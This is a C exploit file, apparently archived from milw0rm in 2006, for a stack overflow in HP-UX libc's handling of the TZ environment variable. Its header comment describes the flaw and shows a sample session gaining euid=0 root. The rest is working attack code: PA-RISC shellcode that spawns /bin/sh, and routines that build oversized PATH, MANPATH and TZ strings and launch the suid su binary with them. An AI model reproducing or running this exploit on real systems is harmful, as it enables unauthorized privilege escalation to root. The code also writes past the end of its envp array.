/* HP-UX libc timezone environment overflow exploit
 * ================================================
 * HP-UX libc contains an exploitable stack overflow
 * in the handling of "TZ" environment variable. The
 * problem occurs due to insufficient bounds checking
 * in the localtime_r() and related functions. Any suid
 * or sgid program which uses the timezone functions can
 * be used as an attack vector. This exploit uses "su" 
 * to obtain root priviledges.  
 *
 * Example. 
 * $ cc prdelka-vs-HPUX-libc.c -o prdelka-vs-HPUX-libc
 * /usr/ccs/bin/ld: (Warning) At least one PA 2.0 object file 
 * (prdelka-vs-HPUX-libc.o) was detected. The linked output may not run 
 * on a PA 1.x system.
 * $ uname -a
 * HP-UX hpux B.11.11 U 9000/785 2012383315 unlimited-user license
 * $ id
 * uid=102(user) gid=20(users)
 * $ ./prdelka-vs-HPUX-libc
 * [ HP-UX libc timezone environment overflow
 * Password:
 * # id
 * uid=102(user) gid=20(users) euid=0(root)
 *
 * - prdelka
 */

char shellcode[]="\xeb\x5f\x1f\xfd\x0b\x39\x02\x99\xb7\x5a\x40\x22"
		 "\x0f\x40\x12\x0e\x20\x20\x08\x01\xe4\x20\xe0\x08"
		 "\xb4\x16\x70\x16""/bin/sh";

int main(){
        char *a, adr[4],ptr1[4],ptr2[4],*b,*envp[3];
        int i;
        *(unsigned long*)adr=0x10eC7f7F;
        *(unsigned long*)ptr1=0x059c7f7f;
        *(unsigned long*)ptr2=0x7f7f059c;
        b=(char*)malloc(126);
        memset(b,0,126);
        a=b;
        sprintf(b,"PATH=");
        b+=5;
        for(i=0;i<120;i++) *b++=ptr1[i%4];
        envp[0]=a;
        b=(char*)malloc(809);
        memset(b,0,809);
        a=b;
        sprintf(b,"MANPATH=");
        b+=8;
        for(i=0;i<800;i++) *b++=ptr1[i%4];
        envp[1]=a;
        b=(char*)malloc(3429);
        memset(b,0,3427);
        a=b;
        sprintf(b,"TZ=");
        b+=3;
        for(i=0;i<2384;i++) *b++=ptr1[i%4];
        for(i=0;i<4;i++) *b++=ptr2[i%4];
        for(i=0;i<1002;i++) *b++=adr[i%4];
        for(i=0;i<strlen(shellcode);i++) *b++=shellcode[i];
        envp[2]=a;
        envp[3]=0;
	printf("[ HP-UX libc timezone environment overflow\n");
        execle("/usr/bin/su","pdk",0,envp);
}

// milw0rm.com [2006-10-24]
